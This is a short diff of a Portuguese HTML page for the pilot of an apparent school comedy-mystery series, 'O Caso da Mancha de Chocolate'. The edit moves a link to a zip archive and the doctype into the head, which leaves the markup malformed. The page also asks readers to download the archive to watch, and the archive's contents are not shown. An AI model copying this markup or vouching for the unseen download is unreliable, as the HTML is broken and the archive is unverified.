@@ -1,11 +1,11 @@
-[operacao-chocolate-piloto_1.zip](https://github.com/user-attachments/files/33308298/operacao-chocolate-piloto_1.zip)
-<!doctype html>
+
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>O Caso da Mancha de Chocolate — Operação Chocolate</title>
-<meta name="description" content="Episódio piloto de uma série escolar de comédia e mistério: O Caso da Mancha de Chocolate. Baixe o projeto para assistir.">
+<meta name="description" content="Episódio piloto de uma série escolar de comédia e mistério: O Caso da Mancha de Chocolate. Baixe o projeto para assistir.">[operacao-chocolate-piloto_1.zip](https://github.com/user-attachments/files/33308298/operacao-chocolate-piloto_1.zip)
+<!doctype html>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
 <style>
   :root{
